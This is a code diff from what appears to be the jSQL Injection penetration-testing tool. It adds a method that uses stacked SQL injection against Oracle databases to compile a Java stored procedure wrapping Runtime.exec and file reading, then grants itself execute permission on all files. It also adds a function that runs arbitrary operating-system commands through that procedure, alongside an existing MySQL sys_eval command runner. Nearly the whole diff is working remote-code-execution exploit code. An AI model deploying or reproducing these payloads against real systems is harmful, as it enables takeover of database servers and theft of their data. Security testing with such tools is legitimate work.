@@ -6,6 +6,7 @@ import com.jsql.model.bean.util.Interaction;
 import com.jsql.model.bean.util.Request;
 import com.jsql.model.exception.JSqlException;
 import com.jsql.model.exception.JSqlRuntimeException;
+import com.jsql.model.injection.vendor.model.VendorYaml;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.LogLevelUtil;
 import com.jsql.util.StringUtil;
@@ -22,6 +23,7 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Objects;
 import java.util.UUID;
@@ -34,6 +36,8 @@ public class UdfAccess {
      */
     private static final Logger LOGGER = LogManager.getRootLogger();
     private static final String NAME_TABLE = "temp";
+    private static final String RCE_JAVA_UTIL_SRC = "RCE_JAVA_UTIL_SRC";
+    private static final String RCE_JAVA_UTIL_FUNC = "RCE_JAVA_UTIL_FUNC";
 
     private final InjectionModel injectionModel;
     private final BiPredicate<String, String> biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -> {
@@ -46,6 +50,64 @@ public class UdfAccess {
 
     public UdfAccess(InjectionModel injectionModel) {
         this.injectionModel = injectionModel;
+    }
+
+    public void createExploitRce(ExploitMethod exploitMethod) throws JSqlException {
+        if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit method not implemented, use query body instead");
+            return;
+        }
+
+        var pattern = " ; drop java source \"%s\";";
+        this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_SRC), "body#drop-src");
+        pattern = " ; drop function %s;";
+        this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_FUNC), "body#drop-src");
+        pattern = " ; %s ";
+        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
+            "BEGIN",
+            "\\n",
+            "EXECUTE IMMEDIATE 'create or replace and compile java source named \"",
+            UdfAccess.RCE_JAVA_UTIL_SRC, "_SRC",
+            "\" as import java.io.*; public class ", UdfAccess.RCE_JAVA_UTIL_SRC, "_SRC{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
+            "\\n",
+            "END;"
+        )), "body#create-src");
+        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
+            "BEGIN",
+            "\\n",
+            "EXECUTE IMMEDIATE 'create or replace function ",
+            UdfAccess.RCE_JAVA_UTIL_FUNC,
+            "(p_cmd in varchar2) return varchar2 as language java name ''",
+            UdfAccess.RCE_JAVA_UTIL_SRC,
+            ".runCmd(java.lang.String) return String'';';",
+            "\\n",
+            "END;"
+        )), "body#create-func");
+        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
+            "BEGIN",
+            "\\n",
+            "dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');",
+            "\\n",
+            "END;"
+        )), "body#grant-exec");
+        var nameDatabase = this.getResult(
+            String.format(
+                "SELECT object_name||'%s' FROM dba_objects WHERE object_name like '%s' and ROWNUM <= 1",
+                VendorYaml.TRAIL_SQL,
+                UdfAccess.RCE_JAVA_UTIL_FUNC
+            ),
+            "body#confirm"
+        );
+        if (!nameDatabase.contains(UdfAccess.RCE_JAVA_UTIL_FUNC)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: java function not found");
+            return;
+        }
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: java function found");
+
+        var request = new Request();
+        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE);
+        request.setParameters(null, null);
+        this.injectionModel.sendToViews(request);
     }
 
     public void createUdf(String pathNetshareFolder, ExploitMethod exploitMethod) throws JSqlException {
@@ -248,10 +310,10 @@ public class UdfAccess {
         );
         var confirm = this.getResult("select group_concat(name)from mysql.func", "udf#confirm");
         if (!confirm.contains("sys_eval")) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Udf failure: sys_eval not found");
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "UDF failure: sys_eval not found");
             return false;
         }
-        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Udf successful: sys_eval found");
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "UDF successful: sys_eval found");
 
         var request = new Request();
         request.setMessage(Interaction.ADD_TAB_EXPLOIT_UDF);
@@ -260,15 +322,37 @@ public class UdfAccess {
         return true;
     }
 
+    public String runCommandRce(String command, UUID uuidShell) {
+        String result;
+        try {
+            result = this.getResult(
+                String.format(
+                    "SELECT %s('%s')||'%s' FROM dual",
+                    UdfAccess.RCE_JAVA_UTIL_FUNC,
+                    command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
+                    VendorYaml.TRAIL_SQL
+                ),
+                "rce#run-cmd"
+            );
+        } catch (JSqlException e) {
+            result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
+        }
+        var request = new Request();
+        request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
+        request.setParameters(uuidShell, result);
+        this.injectionModel.sendToViews(request);
+        return result;
+    }
+
     public String runCommand(String command, UUID uuidShell) {
         String result;
         try {
             result = this.getResult(  // 0xff splits single result in many chunks => replace by space
-                "select cast(replace(sys_eval('"+command+"'),0xff,0x20)as char(70000) character set utf8)",
+                "select cast(replace(sys_eval('"+ command +"'),0xff,0x20)as char(70000) character set utf8)",
                 "udf#run-cmd"
             );
         } catch (JSqlException e) {
-            result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
+            result = "Command failure: "+ e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
         }
         var request = new Request();
         request.setMessage(Interaction.GET_EXPLOIT_UDF_RESULT);
